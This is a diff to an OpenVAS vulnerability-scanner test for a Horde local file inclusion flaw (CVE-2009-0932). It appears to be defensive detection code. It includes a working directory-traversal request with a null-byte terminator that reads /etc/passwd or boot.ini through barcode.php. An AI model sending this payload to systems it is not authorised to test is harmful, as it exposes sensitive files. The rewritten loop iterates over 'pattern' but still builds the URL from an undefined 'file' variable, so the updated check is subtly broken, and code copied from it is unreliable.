@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_horde_lfi_vuln.nasl 11552 2018-09-22 13:45:08Z cfischer $
+# $Id: gb_horde_lfi_vuln.nasl 11796 2018-10-09 13:08:43Z jschulte $
 #
 # Horde Products Local File Inclusion Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = 'cpe:/a:horde:horde_groupware';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801849");
-  script_version("$Revision: 11552 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-22 15:45:08 +0200 (Sat, 22 Sep 2018) $");
+  script_version("$Revision: 11796 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-09 15:08:43 +0200 (Tue, 09 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
   script_cve_id("CVE-2009-0932");
   script_bugtraq_id(33491);
@@ -48,24 +48,24 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("horde_detect.nasl");
+  script_dependencies("horde_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_mandatory_keys("horde/installed");
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to include and execute
-arbitrary local files via directory traversal sequences in the Horde_Image driver name.");
+  arbitrary local files via directory traversal sequences in the Horde_Image driver name.");
 
   script_tag(name:"affected", value:"Horde versions before 3.2.4 and 3.3.3, Horde Groupware versions before
-1.1.5");
+  1.1.5");
 
   script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input to the
-'driver' argument of the 'Horde_Image::factory' method before using it to include PHP code in
-'lib/Horde/Image.php'.");
+  'driver' argument of the 'Horde_Image::factory' method before using it to include PHP code in
+  'lib/Horde/Image.php'.");
 
-  script_tag(name:"solution", value:"Upgarade to Horde 3.2.4 or 3.3.3 and Horde Groupware 1.1.5.");
+  script_tag(name:"solution", value:"Upgrade to Horde 3.2.4 or 3.3.3 and Horde Groupware 1.1.5.");
 
   script_tag(name:"summary", value:"The host is running Horde and is prone to local file inclusion
-vulnerability.");
+  vulnerability.");
 
   exit(0);
 }
@@ -73,6 +73,7 @@ vulnerability.");
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 if (!port = get_app_port(cpe: CPE))
   exit(0);
@@ -83,10 +84,12 @@ if (!dir = get_app_location(cpe: CPE, port: port))
 if (dir == "/")
   dir = "";
 
-foreach file (make_list("/etc/passwd","boot.ini")) {
-  url = dir + "/util/barcode.php?type=../../../../../../../../../../.." + file + "%00";
+files = traversal_files();
 
-  if (http_vuln_check(port:port, url:url, pattern:"(root:.*:0:[01]:|\[boot loader\])", check_header: TRUE)) {
+foreach pattern (keys(files)) {
+  url = dir + "/util/barcode.php?type=../../../../../../../../../../../" + file + "%00";
+
+  if (http_vuln_check(port:port, url:url, pattern:pattern, check_header: TRUE)) {
     report = report_vuln_url(port: port, url: url);
     security_message(port: port, data: report);
     exit(0);
